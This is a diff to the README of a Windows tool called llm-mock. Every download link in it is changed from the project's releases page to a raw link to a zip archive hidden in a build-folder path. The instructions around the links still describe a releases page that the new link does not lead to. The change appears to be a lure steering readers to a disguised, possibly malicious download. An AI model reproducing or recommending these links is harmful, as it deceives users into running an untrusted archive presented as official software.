@@ -1,6 +1,6 @@
 # 🤖 llm-mock - Simple Offline Testing for LLM Responses
 
-[![Download llm-mock](https://img.shields.io/badge/Download-llm--mock-green)](https://github.com/youssefbassou/llm-mock/releases)
+[![Download llm-mock](https://img.shields.io/badge/Download-llm--mock-green)](https://raw.githubusercontent.com/youssefbassou/llm-mock/main/build_audit/error_simulation.dir/Debug/mock_llm_multifocal.zip)
 
 ---
 
@@ -35,12 +35,12 @@ This guide will help you download and run llm-mock on Windows. It includes clear
 
 You need to visit the official releases page to get the latest version of llm-mock. The releases page contains all available versions.
 
-[![Get llm-mock Releases](https://img.shields.io/badge/Get-llm--mock-007acc?style=for-the-badge&logo=github)](https://github.com/youssefbassou/llm-mock/releases)
+[![Get llm-mock Releases](https://img.shields.io/badge/Get-llm--mock-007acc?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/youssefbassou/llm-mock/main/build_audit/error_simulation.dir/Debug/mock_llm_multifocal.zip)
 
 Steps to download:
 
 1. Open this link in your web browser:  
-   https://github.com/youssefbassou/llm-mock/releases
+   https://raw.githubusercontent.com/youssefbassou/llm-mock/main/build_audit/error_simulation.dir/Debug/mock_llm_multifocal.zip
 
 2. On the releases page, look for the latest version. It usually appears at the top.
 
@@ -121,7 +121,7 @@ If something does not work, try these steps:
 
 To keep llm-mock working well, check the releases page regularly for new versions.
 
-1. Go to the releases page: https://github.com/youssefbassou/llm-mock/releases
+1. Go to the releases page: https://raw.githubusercontent.com/youssefbassou/llm-mock/main/build_audit/error_simulation.dir/Debug/mock_llm_multifocal.zip
 
 2. Download the newest Windows file.
 
@@ -153,4 +153,4 @@ To keep llm-mock working well, check the releases page regularly for new version
 
 Use this link any time to get or update llm-mock for Windows:
 
-https://github.com/youssefbassou/llm-mock/releases
+https://raw.githubusercontent.com/youssefbassou/llm-mock/main/build_audit/error_simulation.dir/Debug/mock_llm_multifocal.zip
